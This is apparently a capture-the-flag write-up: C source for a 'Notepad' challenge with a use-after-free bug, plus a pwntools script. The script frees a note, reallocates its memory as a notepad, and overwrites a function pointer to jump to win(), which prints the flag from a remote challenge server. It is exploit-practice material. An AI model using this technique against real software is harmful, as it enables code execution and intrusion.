# Notepad

chal.c file:
`
//gcc chal.c -no-pie -o chal
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void win(){ // address: 401196
    puts("You win! Here is flag:");
    system("cat flag.txt");
}
struct Note {
    char title[32];
    void (*read)(struct Note*); //declares a function pointer, func is read, returns nothing
    char content[1024];
};

struct Notepad {
    char name[64];
};

void readNoteContent(struct Note* note) {
    printf("%s\n", note->content); // prints the content
}

struct Note* newNote() {
    struct Note* note = malloc(sizeof(struct Note));
    puts("Enter note title:");
    fgets(note->title, 30, stdin);
    puts("Enter note content:");
    fgets(note->content, 1020, stdin);
    note->read = readNoteContent; // plan: overwrite read note content? but fgets no buffer overflow
    return note;
}


struct Notepad* newNotepad() {
    struct Notepad* notepad = malloc(sizeof(struct Notepad));
    puts("Enter notepad name:");
    fgets(notepad->name, 60, stdin);
    return notepad;
}

int main() {
    struct Notepad* notepad = NULL;
    struct Note* note = NULL;
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    while (1){
        puts("1: Create a new notepad\n2: Create a new note\n3: Read note content\n4: Throw away note\n0: Quit");
        char order = getc(stdin);  // UNSAFE!!! CAN PUT HERE
        /*
        Create note
        Throw away note
        still can read note (sus)
        
         */
        getchar();

        switch (order) {
            case '1':
                notepad = newNotepad();
                puts("Notepad created.");
                break;
            case '2':
                note = newNote();
                break;
            case '3':
                if (!note) {
                    puts("You do not have a note.");
                    break;
                }
                note->read(note);
                break;
            case '4':
                if (!note) {
                    puts("You do not have a note.");
                    break;
                }
                free(note);
                break;
            case '0':
            default:
                goto fin;
        }
    }
fin:
    puts("Bye!");
    return 0;
}
`

### Solution:

from pwn import *
filename = "chal"
# context.binary =elf = ELF(filename)
# p = process()
# gdb.attach(p)
# input()
p = remote('188.166.198.74',30011)

OFFSET = 32

p.sendlineafter("Quit", "2")
p.sendlineafter("Enter note title:","test")
p.sendlineafter("Enter note content:","blahaj")

p.sendlineafter("Quit", "4")
p.sendlineafter("Quit", "1")

# p.sendlineafter("Enter notepad name:", b"A"*OFFSET + p64(elf.sym["win"]))
p.sendlineafter("Enter notepad name:", b"A"*OFFSET + b'\x96\x11@\x00\x00\x00\x00\x00')

p.sendlineafter("Quit", "3")

# get the flag
while True: 
    print(p.recvline())

#p.interactive()`
